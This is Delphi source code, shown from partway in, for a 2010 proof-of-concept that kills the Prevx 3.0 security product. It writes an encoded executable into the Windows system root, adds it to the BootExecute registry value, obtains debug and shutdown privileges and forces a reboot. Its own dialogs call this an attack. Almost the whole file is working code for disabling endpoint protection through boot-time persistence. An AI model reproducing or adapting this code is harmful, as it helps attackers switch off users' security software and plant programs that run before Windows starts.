    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A
    );

procedure EncodeBuffer(data: PBYTEBUF; size: DWORD; Key: BYTE); stdcall;
var
  c: integer;
begin
  for c := 0 to size do
    data^[c] := BYTE((not BYTE(data[c]) - c) xor Key);
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\pxscan');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

function Install(): boolean;
var
  ns: NTSTATUS;
  bytesIO: DWORD;
  hKey: THANDLE;
  k, u: integer;
  DataSize, DataType: ULONG;
  inf1: PKEY_VALUE_FULL_INFORMATION;
  inf2: PKEY_VALUE_PARTIAL_INFORMATION;
begin
  result := false;
  memzero(@buf, sizeof(buf));
  strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf, TheEndExe);
  EncodeBuffer(@data, sizeof(Data), Key);
  bytesIO := Internal_WriteBufferToFile(buf, @data, sizeof(data), false);
  if (bytesIO = sizeof(Data)) then
  begin
    RtlInitUnicodeString(@str1, BootExecuteKey);
    InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
    if (ZwCreateKey(@hKey, KEY_ALL_ACCESS, @attr, 0, nil, REG_OPTION_NON_VOLATILE, @DataType) <> STATUS_SUCCESS) then exit;

    inf1 := @inbuf;
    RtlInitUnicodeString(@str1, BootExecuteValue);
    if (ZwQueryValueKey(hKey, @str1, KeyValueFullInformation,
      inf1, sizeof(inbuf), @DataSize) = STATUS_SUCCESS) then
    begin
      DataSize := inf1^.DataLength;
      DataType := REG_MULTI_SZ;
      memzero(@inbuf, sizeof(inbuf));
      inf2 := @inbuf;
      ZwQueryValueKey(hKey, @str1, KeyValuePartialInformation, inf2, sizeof(inbuf), @DataType);

      memzero(@outbuf, sizeof(outbuf));
      k := DataSize - sizeof(WCHAR) * 2; //remove #0#0
      memcopy(@outbuf, @inf2^.Data, k);
      u := strlenW(ValueToSet) * sizeof(WCHAR); //calculate new string len
      memcopy(@outbuf[k div sizeof(WCHAR) + 1], ValueToSet, u); //copy to resulting buffer
      k := k + u + (sizeof(WCHAR) * 2); //recalculate length
      ns := ZwSetValueKey(hKey, @str1, 0, REG_MULTI_SZ, @outbuf, k);
      if (ns = STATUS_SUCCESS) then result := true;
    end;
    ZwClose(hKey);
  end;
end;

function CheckStringIsPresentAndReturnStartIndex(Source: PWideChar; SourceSize: DWORD; ValueToLook: PWideChar): integer;
var
  i, k: ULONG;
begin
  result := -1;
  i := 0;
  if (SourceSize > 4192) or (Source = nil) or (ValueToLook = nil) then exit;
  while (i < SourceSize) do
  begin
    if (strcmpiW(Source, ValueToLook) = 0) then
    begin
      result := i;
      exit;
    end;
    k := strlenW(Source) + 1;
    inc(Source, k);
    inc(i, k);
  end;
end;

//Review delete operation!!!!

function Uninstall(): Boolean;
var
  hKey: THANDLE;
  i, k, u, s: ULONG;
  DataSize, DataType: ULONG;
  inf1: PKEY_VALUE_FULL_INFORMATION;
  inf2: PKEY_VALUE_PARTIAL_INFORMATION;
begin
  result := false;

  RtlInitUnicodeString(@str1, MutantName);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  i := ZwCreateMutant(@Mutant, MUTANT_ALL_ACCESS, @attr, false);
  if (i = STATUS_SUCCESS) then
  begin
    NtSleep(2000);
  end;
  RtlInitUnicodeString(@str1, BootExecuteKey);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwCreateKey(@hKey, KEY_ALL_ACCESS, @attr, 0, nil, REG_OPTION_NON_VOLATILE, @DataType) <> STATUS_SUCCESS) then exit;

  inf1 := @inbuf;
  RtlInitUnicodeString(@str1, BootExecuteValue);
  if (ZwQueryValueKey(hKey, @str1, KeyValueFullInformation,
    inf1, sizeof(inbuf), @DataSize) = STATUS_SUCCESS) then
  begin
    DataSize := inf1^.DataLength;
    memzero(@inbuf, sizeof(inbuf));
    memzero(@outbuf, sizeof(outbuf));
    inf2 := @inbuf;
    ZwQueryValueKey(hKey, @str1, KeyValuePartialInformation, inf2, sizeof(inbuf), @DataType);
    i := CheckStringIsPresentAndReturnStartIndex(@inf2^.Data, DataSize, ValueToSet);
    if (i <> $FFFFFFFF) then
    begin
      k := 0;
      u := 0;
      s := strlenW(ValueToSet);
      while (k < DataSize) do
      begin
        if (k < i) or (k > s + i) then
        begin
          outbuf[u] := PWideChar(@inf2^.Data)[k];
          inc(u);
        end;
        inc(k);
      end;
      u := DataSize - (s * sizeof(WCHAR)) - 2;
      ZwSetValueKey(hKey, @str1, 0, REG_MULTI_SZ, @outbuf, u);
    end;
  end;
  ZwClose(hKey);

  memzero(@buf, sizeof(buf));
  strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf, TheEndExe);
  result := Internal_RemoveFile(buf);
end;

function AlreadyInstalled(): boolean; stdcall;
begin
  memzero(@buf, sizeof(buf));
  strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf, TheEndExe);
  result := WinNative.Internal_FileExists(buf);
end;

begin
{$IFDEF debug}

  //install();
  //uninstall();
  exit;
{$ENDIF}
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    MessageBoxW(GetDesktopWindow(), 'Unsupported OS <Всем похуй>', nil, MB_OK);
    ExitProcess(0);
  end;

  if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(GetDesktopWindow(), String1, Title, MB_OK);
    ExitProcess(0);
  end;
  if (Internal_AdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(GetDesktopWindow(), String1, Title, MB_OK);
    ExitProcess(0);
  end;

  if (TargetIsRunning()) then
  begin
    if (AlreadyInstalled) then
    begin //uninstall
      if (MessageBoxW(GetDesktopWindow(), 'TheEnd installed, would you like to uninstall it?', Title, MB_YESNO) = IDYES) then
        if Uninstall() then MessageBoxW(GetDesktopWindow(), 'Uninstalled - OK', Title, MB_OK);
    end
    else //install
    begin
      if (MessageBoxW(GetDesktopWindow(), 'This is user mode proof-of-concept Prevx 3.0 kill'#13#10 +
        'Fucking handles/SSDT/Shadow SSDT will not help Prevx!'#13#13#10 +
        'Yes to perform attack, No to exit program'#13#10 +
        '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;
      if Install() then
      begin
        MessageBoxW(0, 'Installed, reboot now', '', MB_OK);
        ExitWindowsEx(EWX_REBOOT or EWX_FORCE, 0);
      end;
    end;
  end else MessageBoxW(0, 'Prevx not found, start it first =)', Title, MB_OK);

  if (Mutant <> 0) then ZwClose(Mutant);

end.

